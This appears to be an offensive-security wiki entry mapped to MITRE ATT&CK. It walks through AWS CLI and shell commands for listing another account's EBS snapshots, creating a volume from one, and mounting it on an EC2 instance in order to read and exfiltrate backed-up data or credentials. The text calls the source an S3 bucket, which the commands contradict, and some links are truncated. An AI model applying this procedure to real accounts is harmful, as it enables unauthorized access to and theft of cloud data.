---
id: cc9e9e39-dd7d-4bec-8dbb-bd2d781a6440
name: AWS Extract Backup to EC2 Instance
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:53.705407+00:00'
updated_at: '2023-04-06T03:55:53.740670+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Account Discovery|T1087 - Account Discovery]]'
- '[[Data from Cloud Storage|T1530 - Data from Cloud Storage]]'
tags:
- '[[Amazon Bucket S3 AWS]]'
- '[[AWS - Extract Backup]]'
commands:
- '[[Change permission of private key file]]'
- '[[Create AWS volume from snapshot]]'
- '[[Describe Snapshots]]'
- '[[Describe Snapshots with Owner ID]]'
- '[[Get AWS caller identity]]'
- '[[Identify File System Type]]'
- '[[List Block Devices]]'
- '[[Mount Block Device]]'
- '[[SSH into EC2 instance]]'
---

# AWS Extract Backup to EC2 Instance

## Summary

This procedure details the steps to extract a backup from an Amazon S3 bucket and mount it to an EC2 instance. This can be useful for obtaining sensitive data or credentials that may have been backed up. By mounting the backup to an EC2 instance, an attacker can access and exfiltrate the data.  

## Description

# Description

This procedure details the steps to extract a backup from an Amazon S3 bucket and mount it to an EC2 instance. This can be useful for obtaining sensitive data or credentials that may have been backed up. By mounting the backup to an EC2 instance, an attacker can access and exfiltrate the data.

 

## Requirements

1. Valid AWS credentials with access to the S3 bucket

1. Access to an EC2 instance

 

## Defense

1. Ensure that AWS credentials are properly secured and not shared among users

1. Limit access to the S3 bucket and EC2 instance to only authorized users

1. Monitor for suspicious activity on AWS accounts and EC2 instances

 

## Objectives

1. Extract backup from Amazon S3 bucket

1. Mount backup to EC2 instance

1. Access and exfiltrate sensitive data

 

# Instructions

1. Run the AWS CLI command to retrieve the account ID

 



**Code**: [[$ aws --profile flaws sts get-caller-identity
"Acc]]



> This command retrieves the AWS account ID for the user who is currently authenticated.



**Command** ([[Get AWS caller identity]]):

```bash
$ aws --profile flaws sts get-caller-identity
```



2. Run the AWS CLI command to list available snapshots

 



**Code**: [[$ aws --profile profile_name ec2 describe-snapshot]]



> This command lists all available snapshots for the specified AWS account and region. The user can then choose which snapshot to use for the backup.



**Command** ([[Describe Snapshots]]):

```bash
$ aws --profile profile_name ec2 describe-snapshots
```





**Command** ([[Describe Snapshots with Owner ID]]):

```bash
$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
```



3. Run the AWS CLI command to create a volume from the selected snapshot

 



**Code**: [[$ aws --profile swk ec2 create-volume --availabili]]



> This command creates a new volume from the selected snapshot. The user can specify the availability zone and region for the new volume.



**Command** ([[Create AWS volume from snapshot]]):

```bash
$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
```



4. Connect to the EC2 instance using SSH

 



**Code**: [[$ chmod 400 YOUR_KEY.pem
$ ssh -i YOUR_KEY.pem  ub]]



> This command connects to the specified EC2 instance using SSH. The user must have the appropriate SSH key for the instance.



**Command** ([[Change permission of private key file]]):

```bash
$ chmod 400 YOUR_KEY.pem
```





**Command** ([[SSH into EC2 instance]]):

```bash
$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
```



5. Run the necessary commands to mount the volume to the EC2 instance

 



**Code**: [[$ lsblk
$ sudo file -s /dev/xvda1
$ sudo mount /de]]



> These commands list the available block devices, identify the new volume, and mount it to the specified directory.



**Command** ([[List Block Devices]]):

```bash
$ lsblk
```





**Command** ([[Identify File System Type]]):

```bash
$ sudo file -s /dev/xvda1
```





**Command** ([[Mount Block Device]]):

```bash
$ sudo mount /dev/xvda1 /mnt
```



## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Account Discovery|T1087 - Account Discovery]]
- [[Data from Cloud Storage|T1530 - Data from Cloud Storage]]

## Commands Used

- [[Change permission of private key file]]
- [[Create AWS volume from snapshot]]
- [[Describe Snapshots]]
- [[Describe Snapshots with Owner ID]]
- [[Get AWS caller identity]]
- [[Identify File System Type]]
- [[List Block Devices]]
- [[Mount Block Device]]
- [[SSH into EC2 instance]]

## Tags

- [[Amazon Bucket S3 AWS]]
- [[AWS - Extract Backup]]


